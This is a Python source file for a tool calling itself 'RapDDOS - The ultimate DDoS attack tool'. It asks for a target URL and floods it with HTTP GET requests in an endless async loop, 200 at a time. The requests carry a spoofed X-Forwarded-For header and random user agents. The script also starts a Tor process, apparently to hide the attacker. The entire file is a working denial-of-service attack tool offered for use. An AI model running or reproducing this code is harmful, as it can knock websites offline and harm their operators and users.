import sys
import asyncio
import aiohttp
import random
import re
import itertools
import os
import time
import subprocess
from getpass import getpass

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
]

ascii_art = """
██████╗  █████╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝███████║██████╔╝    ██║  ██║██║  ██║██║   ██║███████╗
██╔══██╗██╔══██║██╔═══╝     ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║██║  ██║██║         ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
"""

class AttackThread:
    def __init__(self, target_url):
        self.target_url = target_url

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(UserAgents),
            "X-Forwarded-For": ip_address
        }
        try:
            async with session.get(self.target_url, headers=headers) as response:
                print(f"fsociety@root {self.target_url} - Status: {response.status}")
        except Exception as e:
            print(f"Error sending request: {e}")

    async def attack(self):
        async with aiohttp.ClientSession() as session:
            while True:
                tasks = [self.send_request(session, "") for _ in range(200)]
                await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.attack())

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_text(text, delay=0.02):
    for char in text:
        print(f"\033[95m{char}\033[0m", end='', flush=True)
        time.sleep(delay)
    print()

def create_torrc():
    torrc_path = "/tmp/torrc"
    with open(torrc_path, "w") as f:
        f.write("SOCKSPort 9050\n")
        f.write("ControlPort 9051\n")
    return torrc_path

def start_tor_proxy():
    try:
        torrc_path = create_torrc()
        subprocess.Popen(["tor", "-f", torrc_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] Starting Tor with custom config...")
        time.sleep(2)
    except Exception as e:
        print(f"[!] Error starting Tor: {e}")
        sys.exit(1)

def show_welcome():
    clear_screen()
    animate_text(ascii_art)
    print("\n" + "="*50)
    print("Welcome to RapDDOS - The ultimate DDoS attack tool")
    print("="*50)

def main():
    start_tor_proxy()
    show_welcome()
    target_url = input("\nEnter target URL: ").strip()
    
    attack_thread = AttackThread(target_url)
    attack_thread.run()

if __name__ == "__main__":
    main()
